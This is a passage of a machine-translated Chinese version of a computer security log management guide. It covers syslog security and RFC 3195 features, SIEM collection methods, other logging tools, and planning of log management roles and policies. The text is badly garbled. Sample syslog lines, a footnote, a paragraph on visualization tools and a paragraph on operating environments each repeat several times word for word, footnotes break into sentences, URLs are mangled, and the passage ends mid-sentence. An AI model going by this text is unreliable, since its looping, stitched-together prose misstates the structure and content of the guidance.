server1 su：BAD SU kkent 在 /dev/ttyp2 上根目錄 3 月 1 日 07:28： 41 server1 su: kkent to root on /dev/ttyp2 圖 3-1。系統日誌消息示例 gov 失敗 - 可能的破壞嘗試！3 月 1 日 07:26:28 server1 sshd[22572]：從 172.30.128.115 端口 30606 ssh2 接受 server2 的公鑰 3 月 1 日 07:28:33 server1 su：BAD SU kkent 在 /dev/ttyp2 上根目錄 3 月 1 日 07:28： 41 server1 su: kkent to root on /dev/ttyp2 圖 3-1。系統日誌消息示例 gov 失敗 - 可能的破壞嘗試！3 月 1 日 07:26:28 server1 sshd[22572]：從 172.30.128.115 端口 30606 ssh2 接受 server2 的公鑰 3 月 1 日 07:28:33 server1 su：BAD SU kkent 在 /dev/ttyp2 上根目錄 3 月 1 日 07:28： 41 server1 su: kkent to root on /dev/ttyp2 圖 3-1。系統日誌消息示例

28 在實踐中，一些日誌生成器並沒有像最初預期的那樣使用嚴重性值。例如，他們可以分配嚴重性值來表示某些類別的日誌消息，而與事件嚴重性沒有任何關係。如果系統日誌服務器收到的消息具有不同的嚴重性值分配方式，則日誌分析過程可能會復雜得多。3-6 計算機安全日誌管理指南 3.3.2

Syslog 安全性 Syslog 是在日誌安全性不是主要考慮因素的時候開發的。因此，它不支持使用基本的安全控制來保護日誌的機密性、完整性和可用性。例如，大多數 syslog 實現使用無連接、不可靠的用戶數據報協議 (UDP) 在主機之間傳輸日誌。UDP 不保證日誌條目被成功接收或以正確的順序接收。此外，大多數 syslog 實現不執行任何訪問控制，因此任何主機都可以將消息發送到 syslog 服務器，除非已實施其他安全措施來防止這種情況發生，例如使用物理上獨立的日誌記錄網絡與 syslog 服務器通信，或者在網絡設備上實施訪問控制列表以限制哪些主機可以向系統日誌服務器發送消息。攻擊者可以通過用虛假日誌數據淹沒系統日誌服務器來利用這一點，這可能導致重要的日誌條目被忽視，甚至可能導致拒絕服務。大多數 syslog 實現的另一個缺點是它們無法使用加密來保護傳輸中日誌的完整性或機密性。網絡上的攻擊者可能會監視系統日誌消息，其中包含有關係統配置和安全漏洞的敏感信息；攻擊者還可能執行中間人攻擊，例如修改或破壞傳輸中的系統日誌消息。 29 隨著日誌的安全性越來越受到關注，已經創建了幾個更加強調安全性的 syslog 實現。30 大多數是基於提議的標準 RFC 3195，該標準專門設計用於提高 syslog 的安全性。31 基於 RFC 3195 的實現可以支持日誌機密性，通過多種功能實現完整性和可用性，包括以下內容：可靠的日誌傳送。除了 UDP 之外，一些系統日誌實現還支持使用傳輸控制協議 (TCP)。TCP 是一種面向連接的協議，它試圖確保跨網絡可靠地傳遞信息。使用 TCP 有助於確保日誌條目到達目的地。擁有這種可靠性需要使用更多的網絡帶寬；此外，日誌條目通常需要更多時間才能到達目的地。一些 syslog 實現使用日誌緩存服務器，如第 3.1 節所述。� 傳輸保密保護。RFC 3195 建議使用傳輸層安全 (TLS) 協議來保護傳輸的系統日誌消息的機密性。32 TLS 可以在主機之間的整個傳輸過程中保護消息。TLS 只能保護數據包的有效負載，而不是它們的 IP 標頭，這意味著網絡上的觀察者可以識別傳輸的系統日誌消息的來源和目的地，可能會洩露系統日誌服務器和日誌源的 IP 地址。一些系統日誌實現使用其他方式來加密網絡流量，例如通過安全外殼 (SSH) 隧道傳遞系統日誌消息。保護系統日誌傳輸可能需要額外的網絡帶寬，並增加日誌條目到達目的地所需的時間。� 傳輸完整性保護和認證。RFC 3195 建議如果需要完整性保護和身份驗證，則使用消息摘要算法。RFC 3195推薦使用MD5；對 RFC 3195 的提議修訂提到了 SHA-1 的使用。29 RFC 3164 的第 6 節提供了有關 syslog 實施中安全弱點的更多信息。30 附錄 D 包含常見系統日誌實現的列表。31 RFC 3195，系統日誌的可靠交付，可在 RFC 3195推薦使用MD5；對 RFC 3195 的提議修訂提到了 SHA-1 的使用。29 RFC 3164 的第 6 節提供了有關 syslog 實施中安全弱點的更多信息。30 附錄 D 包含常見系統日誌實現的列表。31 RFC 3195，系統日誌的可靠交付，可在 RFC 3195推薦使用MD5；對 RFC 3195 的提議修訂提到了 SHA-1 的使用。29 RFC 3164 的第 6 節提供了有關 syslog 實施中安全弱點的更多信息。30 附錄 D 包含常見系統日誌實現的列表。31 RFC 3195，系統日誌的可靠交付，可在http://www.ietf.org/rfc/rfc3195.txt。目前正在製定對擬議的系統日誌標準的其他修訂。有關 syslog 標準的最新信息，請訪問名為“網絡事件日誌中的安全問題”的 Internet 工程任務組 (IETF) 工作組的網站，該網站位於http://www.ietf.org/html.charters/syslog -章程html。32 RFC 2246，TLS 協議版本 1.0，定義了 TLS 的標準。它可在http://www.ietf.org/rfc/rfc2246.txt獲得. 3-7 計算機安全日誌管理指南 因為 SHA 是 FIPS 批准的算法而 MD5 不是，所以聯邦機構應該在可行的情況下使用 SHA 而不是 MD5 作為消息摘要。 33 一些系統日誌實現提供了不基於 RFC 3195 的附加功能. 最常見的額外功能如下： � Robust Filtering。最初的 syslog 實現僅允許根據消息的設施和優先級對消息進行不同的處理；不允許進行更細粒度的過濾。當前的一些 syslog 實現提供了更強大的過濾功能，例如根據生成消息的主機或程序以不同方式處理消息，或者根據消息正文中的正則表達式匹配內容。一些實現還允許將多個過濾器應用於單個消息，它提供了更複雜的過濾功能。� 日誌分析。最初，syslog 服務器不對日誌數據進行任何分析；它們只是提供了一個用於記錄和傳輸日誌數據的框架。管理員可以使用單獨的附加程序來分析系統日誌數據。一些 syslog 實現現在內置了有限的日誌分析功能，例如關聯多個日誌條目的能力。� 事件響應。某些系統日誌實現可以在檢測到某些事件時啟動操作。操作示例包括發送 SNMP 陷阱、通過頁面或電子郵件提醒管理員以及啟動單獨的程序或腳本。也可以創建一個新的系統日誌消息來指示檢測到某個事件。� 替代消息格式。一些系統日誌實現可以接受非系統日誌格式的數據，例如 SNMP 陷阱。這有助於從不支持系統日誌且無法修改的主機獲取安全事件數據。� 日誌文件加密。一些 syslog 實現可以配置為自動加密旋轉的日誌文件，保護它們的機密性。這也可以通過使用操作系統或第三方加密程序來實現。� 日誌的數據庫存儲。一些實現可以將日誌條目存儲在傳統的系統日誌文件和數據庫中。以數據庫格式保存日誌條目對於後續的日誌分析非常有幫助。� 速率限制。某些實現可以限制特定時間段內來自特定源的系統日誌消息或 TCP 連接的數量。這有助於防止系統日誌服務器拒絕服務和其他來源的系統日誌消息丟失。由於此技術旨在導致來自使系統日誌服務器不堪重負的來源的消息丟失，因此它可能會導致某些日誌數據在生成異常大量消息的不利事件期間丟失。使用基於原始系統日誌消息格式和傳輸協議的系統日誌實現的組織應考慮使用為機密性、完整性和可用性提供更強保護的系統日誌實現。其中許多實現可以直接替換現有的系統日誌實現。在評估系統日誌替換時，組織應特別注意互操作性，因為許多系統日誌客戶端和服務器提供 RFC 3195 或其他標準相關工作中未指定的功能。此外，使用安全信息和事件管理軟件（如第 3.4 節所述）存儲或分析系統日誌消息的組織應確保其係統日誌客戶端和服務器與安全信息和事件管理軟件完全兼容和互操作。

33 有關選擇適當 SHA 算法的建議，請參閱第 3.2 節。3-8 計算機安全日誌管理指南 3.4 安全信息和事件管理軟件 安全信息和事件管理 (SIEM) 軟件34 與 syslog 相比是一種相對較新的集中式日誌記錄軟件。35 SIEM 產品具有一個或多個日誌服務器來執行日誌記錄分析，以及一個或多個存儲日誌的數據庫服務器。36​​ 大多數 SIEM 產品支持兩種從日誌生成器收集日誌的方法：無代理。SIEM 服務器從各個日誌生成主機接收數據，而無需在這些主機上安裝任何特殊軟件。一些服務器從主機中提取日誌，這通常是通過讓服務器對每個主機進行身份驗證並定期檢索其日誌來完成的。在其他情況下，主機將他們的日誌推送到服務器，這通常涉及每個主機向服務器進行身份驗證並定期傳輸其日誌。無論是推送還是拉取日誌，服務器都會對收集到的日誌進行事件過濾聚合和日誌歸一化分析。� 基於代理。在日誌生成主機上安裝代理程序，對特定類型的日誌進行事件過濾聚合和日誌歸一化，然後將歸一化後的日誌數據傳輸到SIEM服務器，通常是實時或近實時用於分析和存儲。如果主機有多種感興趣的日誌類型，則可能需要安裝多個代理。一些 SIEM 產品還提供通用格式的代理，例如 syslog 和 SNMP。通用代理主要用於從特定格式代理和無代理方法不可用的源獲取日誌數據。一些產品還允許管理員創建自定義代理來處理不受支持的日誌源。每種方法都有優點和缺點。無代理方法的主要優點是不需要在每個日誌主機上安裝、配置和維護代理。主要缺點是在單個主機級別缺乏過濾和聚合，這可能導致通過網絡傳輸大量數據並增加過濾和分析日誌所需的時間。無代理方法的另一個潛在缺點是 SIEM 服務器可能需要憑據來對每個日誌主機進行身份驗證。在某些情況下，兩種方法只有一種可行；例如，如果不在特定主機上安裝代理，則可能無法從該主機遠程收集日誌。SIEM 產品通常包括對幾十種日誌源的支持，例如操作系統、安全軟件、應用服務器（例如 Web 服務器、電子郵件服務器），甚至物理安全控制設備（例如徽章閱讀器）。對於每個支持的日誌源類型，除了 syslog 等通用格式外，SIEM 產品通常知道如何對最重要的記錄字段進行分類（例如，應用程序 XYZ 日誌的第 12 字段中的值表示源 IP 地址）。這顯著改進了日誌數據的規範化、分析和關聯，而不是通過軟件執行的，對特定日誌源和格式的理解不太精細。還，

34 通常用於類似 SIEM 產品的其他術語是安全事件管理 (SEM) 和安全信息管理 (SIM)。本出版物使用術語 SIEM，因為它通常被認為比其他術語具有更廣泛的含義。曾幾何時，許多產品要么是 SEM 特定的（通常側重於事件響應），要么是 SIM 特定的（通常側重於審計）。大多數當前產品都執行一些 SEM 和一些 SIM 功能，因此 SIEM 術語更適合它們。本出版物中使用的術語 SIEM 並不意味著確定，而只是為出版物中的後續討論提供基礎。35 另一種類型的日誌記錄軟件稱為日誌管理軟件。儘管其中一些產品具有與 SIEM 產品類似的功能，它們通常旨在處理範圍廣泛的日誌條目，而不側重於分析與安全相關的日誌條目。因此，此類產品的討論超出了本指南的範圍。但是，這並不意味著此類產品不能用於計算機安全日誌管理。36 幾乎所有可用的 SIEM 產品都是商業產品。3-9 計算機安全日誌管理指南 通過忽略那些對計算機安全不重要的數據字段來減少日誌，可能會減少 SIEM 軟件的網絡帶寬和數據存儲使用。無論它如何接收日誌數據（通過代理或無代理方法），SIEM 服務器都會分析來自所有不同日誌源的數據，關聯日誌條目之間的事件，識別重要事件並確定其優先級，37 並在需要時啟動對事件的響應。SIEM 產品通常包括幾個功能來幫助日誌監控人員，例如： 圖形用戶界面 (GUI) 專門設計用於幫助分析師識別潛在問題並審查與每個問題相關的所有可用數據 安全知識庫，有關已知漏洞的信息、某些日誌消息的可能含義以及其他技術數據；日誌分析師通常可以根據需要自定義知識庫 事件跟踪和報告功能，有時具有強大的工作流功能 資產信息存儲和關聯（例如，對針對易受攻擊的操作系統或更重要的主機的攻擊給予更高的優先級）。沒有特定於 SIEM 的標準，因此每個 SIEM 產品都以其選擇的任何格式存儲和傳輸數據。但是，SIEM 產品通常提供保護日誌數據的機密性、完整性和可用性的功能。例如，代理和 SIEM 服務器之間的網絡通信通常通過可靠的 TCP 協議進行並且是加密的。此外，代理和 SIEM 服務器可能需要相互提供憑證並在傳輸數據之前成功通過身份驗證（例如，代理向服務器發送日誌、服務器重新配置代理）。3.5 其他類型的日誌管理軟件 其他類型的軟件也可能有助於日誌管理，包括： � 基於主機的入侵檢測系統 (IDS)。基於主機的 IDS 監視單個主機的特徵和主機內發生的事件以查找可疑活動。許多基於主機的 IDS 產品監控主機的操作系統、安全軟件和應用程序日誌。一些基於主機的 IDS 產品僅使用日誌作為檢測可疑活動的多個數據源之一，而其他基於主機的 IDS 產品僅監視日誌。通常，使用日誌數據的基於主機的 IDS 具有已知惡意活動的簽名，它與日誌條目進行匹配以識別感興趣的事件。然而，此類產品通常側重於操作系統日誌和最常見的安全軟件和應用程序，很少或根本不支持不太常見的軟件。可視化工具。可視化工具以圖形格式呈現安全事件數據。例如，一個工具可以顯示按不同事件特徵（例如源地址）的值分組或排序的數據。然後分析人員可以在顯示中尋找模式並對其進行操作，例如抑制已知的良性活動，以便僅顯示未知事件。可視化工具可以非常有效地分析某些類型的日誌數據，例如顯示在涉及多台主機的攻擊中發生的事件序列。許多 SIEM 產品都有內置的可視化工具。第三方工具也可以添加到缺少它們的日誌管理基礎架構中，但使用它們可能比內置工具更具挑戰性。將數據導入第三方工具並顯示通常相對簡單，但 例如顯示在涉及多台主機的攻擊中發生的事件順序。許多 SIEM 產品都有內置的可視化工具。第三方工具也可以添加到缺少它們的日誌管理基礎架構中，但使用它們可能比內置工具更具挑戰性。將數據導入第三方工具並顯示通常相對簡單，但 例如顯示在涉及多台主機的攻擊中發生的事件順序。許多 SIEM 產品都有內置的可視化工具。第三方工具也可以添加到缺少它們的日誌管理基礎架構中，但使用它們可能比內置工具更具挑戰性。將數據導入第三方工具並顯示通常相對簡單，但

37 一些 SIEM 產品可以根據事件與其他信息源（例如漏洞掃描的結果）的關聯來確定事件的優先級。3-10 計算機安全日誌管理指南 學習如何有效地使用該工具將大型數據集縮減為幾個感興趣的事件可能需要付出相當大的努力。� 日誌旋轉實用程序。管理員可以使用專門的第三方實用程序來輪轉日誌。這些有助於改進日誌源的日誌管理，這些日誌源不提供足夠強大的日誌輪換功能或任何功能。� 日誌轉換實用程序。許多軟件供應商提供日誌轉換實用程序，可用於將其專有格式日誌轉換為標準格式。這些實用程序有助於將不太常見的日誌源的數據合併到日誌管理基礎架構中，例如當 SIEM 產品不提供對特定日誌格式的支持時。當使用基於 syslog 的日誌管理基礎架構並且一個或多個日誌生成器無法直接記錄到 syslog 時，日誌轉換實用程序也很有用。3.6 總結 日誌管理基礎設施包括用於生成、傳輸、存儲、分析和處理日誌數據的硬件、軟件、網絡和介質。日誌管理基礎設施通常執行多種支持事件分析的功能，例如過濾、聚合、規範化和關聯。基礎設施還通過日誌解析、查看、分析等功能幫助訪問和維護日誌數據，輪轉和歸檔，以及日誌文件完整性檢查。日誌管理基礎架構通常基於基於系統日誌的集中式日誌記錄軟件或安全信息和事件管理軟件，通常使用三層設計。第一層包含生成原始日誌數據的主機。第二層包括集中式日誌服務器，執行整合和數據存儲。第三層包含用於監視和查看日誌數據的控制台，也可以選擇用於管理日誌服務器和客戶端。各層之間的通信通常通過組織的常規網絡進行，但也可能通過單獨的日誌記錄網絡進行路由。組織也可能擁有無法積極參與日誌管理基礎設施的日誌生成主機，例如未聯網的計算機、遺留系統和基於設備的設備；管理員可以通過可移動媒體將數據從這些主機手動傳輸到基礎設施，或者在本地管理和分析數據。在基於系統日誌的集中式日誌基礎架構中，每個日誌生成器都使用相同的標準日誌格式並將其日誌條目轉發到集中式日誌服務器。因為 syslog 是一個簡單的標準協議，它可以被許多操作系統、安全軟件程序和應用程序使用。原始的 syslog 標准在處理不同類型的事件時沒有提供太多粒度。此外，由於它的數據字段很少，因此當多個日誌源生成事件時，很難提取為每個事件記錄的數據的含義。Syslog 是在日誌安全不是主要問題時開發的；原始的 syslog 標準沒有提供保護日誌的機密性、完整性和可用性的功能。為了提高 syslog 部署的安全性，已經創建了一個新的提議標準來提供更強大的安全功能，並且各種 syslog 實現都添加了可靠日誌傳輸等功能；傳輸加密、完整性保護和認證；強大的過濾；自動事件響應；日誌文件加密；和事件速率限制。使用 syslog 的組織應考慮使用安全的 syslog 實施，特別注意互操作性，因為許多 syslog 客戶端和服務器提供當前標準中未指定的功能。與基於單一標準的基於系統日誌的基礎架構不同，安全信息和事件管理 (SIEM) 軟件主要使用專有數據格式。SIEM 產品具有執行日誌分析的集中式服務器和用於日誌存儲的數據庫服務器。大多數 SIEM 產品需要在每個日誌生成主機上安裝 3-11 計算機安全日誌管理代理指南；代理對特定類型的日誌執行過濾、聚合和規範化。代理還負責實時或近乎實時地將日誌數據從各個主機傳輸到中央 SIEM 服務器。其他 SIEM 產品是無代理的，依賴 SIEM 服務器從日誌主機中提取數據並執行代理通常執行的功能。SIEM 產品通常支持幾十種類型的日誌源，包括 syslog 等通用格式。由於 SIEM 產品通常了解特定日誌源格式的每個記錄字段的含義，因此基於 SIEM 的日誌管理基礎架構在對來自多個日誌源的日誌數據執行規範化、分析和關聯方面通常優於基於 syslog 的基礎架構。SIEM 產品可以分析來自多個來源的數據，識別重大事件，並在需要時啟動自動響應。SIEM 產品還可能包括分析 GUI、安全知識庫、事件跟踪和報告功能以及資產信息存儲和關聯功能。SIEM 產品通常還提供保護日誌數據的機密性、完整性和可用性的功能。儘管 SIEM 軟件通常提供比 syslog 更強大和更廣泛的日誌管理功能，與集中式系統日誌實施相比，SIEM 軟件的部署通常更加複雜和昂貴。此外，由於代理執行的處理，SIEM 軟件通常比 syslog 對於單個主機佔用更多資源。除了 syslog 和 SIEM 軟件之外，還有其他幾種類型的軟件可能有助於日誌管理。基於主機的入侵檢測系統 (IDS) 監視主機的特徵和其中發生的事件，其中可能包括操作系統、安全軟件和應用程序日誌。基於主機的 IDS 產品通常是日誌管理基礎設施的一部分，但它們不能取代 syslog 和 SIEM 軟件。其他有助於日誌管理的實用程序包括可視化工具、日誌輪換實用程序和日誌轉換實用程序。3-12 計算機安全日誌管理指南 4. 日誌管理規劃 為了建立和維護成功的日誌管理基礎設施，組織應該執行重要的規劃和其他執行日誌管理的準備行動。這對於創建滿足組織需求和要求並為組織提供額外價值的一致、可靠和高效的日誌管理實踐非常重要。本節描述了日誌管理角色和職責的定義、可行的日誌記錄策略的創建以及日誌管理基礎設施的設計。第 5 節描述了日誌管理的操作方面。4.1 定義角色和職責作為日誌管理規劃過程的一部分，組織應定義預期參與日誌管理的個人和團隊的角色和職責。經常參與日誌管理的團隊和個人角色包括： 系統和網絡管理員，他們通常負責在個人系統和網絡設備上配置日誌記錄，定期分析這些日誌，報告日誌管理活動的結果，並定期執行日誌和日誌軟件的維護——安全管理員，他們通常負責管理和監控日誌管理基礎設施，配置安全設備（例如，防火牆，基於網絡的入侵檢測系統，防病毒服務器）的日誌記錄，報告日誌管理的結果活動，並協助其他人配置日誌記錄和執行日誌分析38 計算機安全事件響應團隊，他們在處理某些事件時使用日誌數據信息安全官，負責監督日誌管理基礎設施 首席信息官 (CIO)，負責監督生成、傳輸和存儲日誌的 IT 資源 審計員，在執行審計時可能使用日誌數據 參與日誌的個人採購應該或可以生成計算機安全日誌數據的軟件。組織需要特別考慮操作日誌管理職責的分配。一些組織，特別是那些具有高度管理環境的，可能會選擇集中執行所有日誌管理，而不是在單個系統級別。然而，在大多數組織中，日誌管理並不是那麼集中。通常，系統、網絡和安全管理員負責管理其係統上的日誌記錄，定期分析其日誌數據，記錄和報告其日誌管理活動的結果，並確保將日誌數據提供給日誌管理基礎設施根據組織的政策。

38 由於許多系統、網絡和安全管理員認為某些日誌管理職責（例如日誌分析和維護）枯燥乏味，因此組織應考慮在管理員之間輪換此類職責以防止倦怠。通過提供減少工作量並允許管理員專注於日誌管理更有趣的方面的工具和技術，還可以使職責變得不那麼平凡。4-1 計算機安全日誌管理指南 此外，一些組織的安全管理員充當日誌管理基礎架構管理員，其職責如下：本地系統無法傳輸其日誌數據）並在出現問題時啟動適當的響應 測試和實施日誌管理基礎架構組件的升級和更新 維護日誌管理基礎架構的安全性。許多日誌管理基礎架構管理員的另一個主要職責是驗證系統級管理員的工作。在決定如何劃分日誌管理職責時，組織可能需要考慮職責分離和問責制。例如，讓系統管理員以外的人查看特定係統的日誌有助於為系統管理員的操作提供責任，包括確認日誌記錄已啟用。如果希望將大量日誌數據轉發到日誌服務器以供獨立審查，職責分離的考慮會對組織的日誌記錄策略、支持日誌記錄所需的資源以及日誌管理基礎架構的設計產生重大影響。組織需要確定係統級管理員應完成多少分析，日誌管理基礎架構管理員應完成多少分析。通常，至少應該在系統級別執行一些分析，因為系統管理員通常可以為日誌數據中記錄的事件提供上下文。例如，如果日誌顯示系統在一小時內重新啟動 3 次，基礎架構管理員可能無法通過查看其他日誌條目來確定發生這種情況的原因，但是本地管理員會知道系統當時正在修補並且重新啟動是有意的。執行系統級分析的另一個原因是本地管理員可能與基礎設施管理員有不同的興趣，例如識別操作問題和其他非安全問題。此外，基礎架構管理員通常無法查看所有事件，而且需要跨網絡傳輸到日誌管理基礎架構的數據也太多。在系統級別執行分析也有助於管理員更好地了解每個系統的特性，以便他們可以微調日誌記錄配置。在基礎架構級別執行一些分析在某些方面特別有用。與系統級分析相比，它更有可能以近實時的方式執行；這支持更快速地響應

39 第 5.4 節包含有關日誌數據存檔的其他信息，包括媒體選擇、完整性檢查和媒體存儲。4-2 計算機安全日誌管理指南 嚴重的安全事件，有助於將安全事件的影響降至最低。通常，應持續分析最有可能記錄重要事件的日誌數據，並與對網絡入侵檢測系統、防病毒軟件和網絡防火牆等其他關鍵集中式安全控制的監控保持一致。 40 此外，在基礎設施上進行分析級別可以發現跨多個系統的事件模式，例如協調或廣泛的攻擊（例如，惡意軟件、分佈式拒絕服務），以及組織系統之間的攻擊。另一個原因，如前所述，是系統級管理員和基礎架構管理員之間的職責分離。一般來說，在確定如何劃分分析職責時，組織應該關注不同類型條目的相對重要性以及理解每個日誌條目真正含義所必需的上下文。組織應該仔細考慮基礎架構管理員可能能夠使用的可能的上下文來源，例如變更管理信息。對於通常不需要上下文的條目類型，組織應考慮盡可能自動化和集中分析。對於確實需要上下文的條目類型，組織應該依賴系統級管理員或通過支持日誌條目確保基礎架構管理員可以使用必要的上下文，變更管理程序數據或其他來源。為確保系統級別的日誌管理在整個組織中得到有效執行，這些系統的管理員需要從組織中獲得足夠的支持。假設系統級管理員有典型的職責，組織對他們的支持應該包括以下行動：傳播信息並提供有關各個系統及其管理員在日誌管理基礎設施中扮演的角色的培訓提供聯繫點誰可以回答管理員關於日誌記錄的問題 鼓勵管理員提交他們的經驗教訓，並提供一種機制來傳播他們的想法（例如，郵件列表、內部 Web 論壇、workshop) 提供關於將系統日誌數據與日誌管理基礎架構集成的具體技術指導，例如實施 SIEM 代理或建立本地系統日誌實施 考慮建立日誌記錄測試環境。該組織可以測試常見日誌記錄源的各種配置、記錄建議和說明，並將它們傳播給管理員以供他們使用。這些信息應該可以幫助他們更有效、更一致地配置他們的日誌記錄，並節省他們的時間。使管理員可以使用日誌輪換腳本和日誌分析軟件等工具以及文檔。組織應考慮在測試環境中實施這些，並記錄使用它們的建議和說明。組織還應該為基礎架構管理員提供類似的支持，重點是培訓和工具。4.2 建立日誌記錄策略組織應該定義其執行日誌記錄和監控日誌的要求和目標，如第 2.2 節所述。這些要求應包括所有適用的法律、法規和現有的

40 在許多組織中，同一組安全管理員監控大部分或所有主要的集中式安全控制。有關作為事件響應程序的一部分監控安全控制的更多信息，請參閱 NIST SP 800-61，計算機安全事件處理指南，可在http://csrc獲取nist.gov/publications/nistpubs/。4-3 計算機安全日誌管理指南 組織政策，例如數據保留政策。目標應基於平衡組織的風險降低與執行日誌管理功能所需的時間和資源。然後，這些要求和目標應該被用作建立組織範圍的日誌管理能力和在整個企業中適當地優先考慮日誌管理的基礎。組織應制定政策，明確定義強制性要求和日誌管理幾個方面的建議，包括以下內容：41 日誌生成 – 哪些類型的主機必須或應該執行日誌記錄 – 哪些主機組件必須或應該執行日誌記錄（例如，操作系統， 服務，

41 對於擁有復雜的多層日誌管理基礎設施的組織，每一層可能需要單獨的要求。42 對於許多日誌源，這是不可配置的；事件每次發生時都會被記錄下來。一些日誌源不記錄每個單獨的事件；例如，操作系統可能僅在連續三次登錄失敗後才記錄未經授權的訪問嘗試。另一個例子是入侵檢測系統，直到它在一分鐘內看到 10 台主機被掃描時才會發出警報。43 有關日誌保留要求的信息來源是國家檔案和記錄管理局 (NARA) 一般記錄附表 (GRS) 20，可在http://www.archives.gov/records-mgmt/ardor/grs20 html 上找到。NARA 的聯邦檔案管理網站位於http://www.archives.gov/records-mgmt/. 4-4 計算機安全日誌管理指南 - 每種類型的日誌數據必須或應該保留多長時間（在系統級別和基礎設施級別）46 - 不需要的日誌數據必須或應該如何處理（在系統級別）級別和基礎架構級別） – 必須或應該提供多少日誌存儲空間（在系統級別和基礎架構級別） – 日誌保存請求如何，例如防止更改和破壞特定日誌記錄的法律要求，必須處理（例如，必須如何標記、存儲和保護受影響的日誌） 日誌分析——必須或應該分析每種類型的日誌數據的頻率（在系統級別和基礎設施級別）——誰必須或應該能夠訪問日誌數據（在系統級別和基礎架構級別），以及應如何記錄此類訪問 – 當發現可疑活動或異常時必須或應該做什麼在存儲（系統級和基礎設施級）和傳輸中——應如何處理記錄在日誌中的敏感信息（例如密碼或電子郵件內容）的無意洩露。組織的政策還應說明組織內誰可以建立和管理日誌管理基礎設施。組織還應確保與日誌記錄有某種關係的其他政策、指南和程序包含並支持這些日誌管理要求和建議，並且還符合功能和操作要求。一個例子是確保軟件採購和自定義應用程序開發活動考慮到日誌管理要求。表 4-1 提供了要在策略中指定的日誌記錄配置設置類型的示例。組織不應按原樣採用這些值，而應將它們用作確定的起點

44 保護可用性的一個例子是製作日誌數據的多個副本並將它們存儲在不同的位置，這樣即使一個副本被損壞或毀壞，數據仍然可用。45 有關以合理的方式保存日誌的更多信息，請參閱 NIST SP 800-86，將取證技術集成到事件響應中的指南，可在http://csrcnist.gov/publications/nistpubs/。46 這可以通過多種方式對數字取證產生重大影響。首先，在事件發生數週或數月後，可能需要有關特定事件的數據。其次，某些存儲介質（例如，從磁帶加載歸檔日誌而不是直接查詢在線日誌文件）可能會顯著降低日誌查詢等取證分析的速度。第三，如果數據沒有存儲在分析師所在的地方，例如本地分析師無法訪問遠程集中式日誌存儲，取證分析也可能會變慢。在設置日誌存儲要求和設計日誌管理基礎架構時，組織應牢記數字取證需求。47 組織的事件響應相關政策應該已經解決了該項目。提供有關如何處理異常和可疑活動的指導超出了本出版物的範圍。有關事件處理的更多信息，請參閱 NIST SP 800-61，計算機安全事件處理指南，可在 http://csrc nist.gov/publications/nistpubs/。4-5

計算機安全日誌管理指南 日誌數據的分析幾乎是不可能的。此外，任何來源記錄的日誌數據量往往是非常動態的，短期內經常變化，長期內也會發生整體變化。一次合理的日誌記錄設置在另一次可能不可行，尤其是在不利情況下。記錄更多的數據不一定更好；一般而言，組織應該只要求記錄和分析最重要的數據，並且如果時間和資源允許，還應該記錄和分析其他類型和來源的數據的非強制性建議。一些組織選擇生成所有或幾乎所有日誌數據，並至少在短時間內存儲，以備不時之需；這種方法有利於安全考慮，而不是可用性和資源使用。在建立要求和建議時，組織應該靈活，因為每個主機都是不同的，並且會記錄與其他主機不同的數據量。靈活性也很重要，因為主機的日誌記錄行為可能會因升級、補丁或配置更改而迅速改變。組織還應該允許管理員在不利的系統或網絡條件下臨時重新配置日誌記錄，例如導致多次生成相同類型的日誌條目的不成功的惡意軟件攻擊。這些配置更改應作為最後的手段執行，並且應盡可能精確。系統級管理員應將此類配置更改通知基礎架構管理員，以確保在需要時修改日誌監控和分析流程。在製定政策時，組織還應考慮系統所在的環境。NIST SP 800-70，IT 產品安全配置檢查表程序——檢查表用戶和開發人員指南，確定了幾種常見的操作環境。51 下面描述了其中的四種環境，並解釋了每種環境的特徵如何影響日誌記錄策略。組織可能會考慮為每個環境中的系統提供單獨的日誌記錄策略。� 小型辦公室/家庭辦公室 (SOHO) 描述用於家庭或商業目的的小型、非正式的計算機安裝。SOHO 包含各種小型環境和設備，從筆記本電腦、移動設備或家用電腦到遠程辦公系統，再到小型企業和公司的小型分支機構。許多 SOHO 系統與組織的主要網絡有間歇性的低帶寬連接，這可能會顯著影響日誌管理基礎架構的使用和集成。可能有必要設計一個日誌管理基礎設施，以盡量減少從 SOHO 系統到基礎設施的數據傳輸。� 企業環境通常由大型組織系統組成，這些系統具有定義的、有組織的硬件和軟件配置套件，通常由集中管理的工作站和服務器組成，這些工作站和服務器受到防火牆和其他網絡安全設備的保護，不受互聯網的影響。在所有環境中，企業環境通常是最容易執行日誌管理的環境。自定義環境包含系統的功能和程度不適合其他環境的系統。兩種典型的自定義環境是專用安全受限功能和遺留： – 專用安全受限功能環境包含遭受攻擊或數據暴露的高風險的系統和網絡，安全優先於功能。他們假設系統在高度威脅的環境中具有有限或專門的功能（不是通用工作站或系統），例如面向外的防火牆或公共 Web 服務器，或者其數據內容或任務目的具有如此價值，以至於 51 NIST SP 800-70 可從以下網址下載 企業環境通常是最容易執行日誌管理的環境。自定義環境包含系統的功能和程度不適合其他環境的系統。兩種典型的自定義環境是專用安全受限功能和遺留： – 專用安全受限功能環境包含遭受攻擊或數據暴露的高風險的系統和網絡，安全優先於功能。他們假設系統在高度威脅的環境中具有有限或專門的功能（不是通用工作站或系統），例如面向外的防火牆或公共 Web 服務器，或者其數據內容或任務目的具有如此價值，以至於 51 NIST SP 800-70 可從以下網址下載 企業環境通常是最容易執行日誌管理的環境。自定義環境包含系統的功能和程度不適合其他環境的系統。兩種典型的自定義環境是專用安全受限功能和遺留： – 專用安全受限功能環境包含遭受攻擊或數據暴露的高風險的系統和網絡，安全優先於功能。他們假設系統在高度威脅的環境中具有有限或專門的功能（不是通用工作站或系統），例如面向外的防火牆或公共 Web 服務器，或者其數據內容或任務目的具有如此價值，以至於 51 NIST SP 800-70 可從以下網址下載 自定義環境包含系統的功能和程度不適合其他環境的系統。兩種典型的自定義環境是專用安全受限功能和遺留： – 專用安全受限功能環境包含遭受攻擊或數據暴露的高風險的系統和網絡，安全優先於功能。他們假設系統在高度威脅的環境中具有有限或專門的功能（不是通用工作站或系統），例如面向外的防火牆或公共 Web 服務器，或者其數據內容或任務目的具有如此價值，以至於 51 NIST SP 800-70 可從以下網址下載 自定義環境包含系統的功能和程度不適合其他環境的系統。兩種典型的自定義環境是專用安全受限功能和遺留： – 專用安全受限功能環境包含遭受攻擊或數據暴露的高風險的系統和網絡，安全優先於功能。他們假設系統在高度威脅的環境中具有有限或專門的功能（不是通用工作站或系統），例如面向外的防火牆或公共 Web 服務器，或者其數據內容或任務目的具有如此價值，以至於 51 NIST SP 800-70 可從以下網址下載 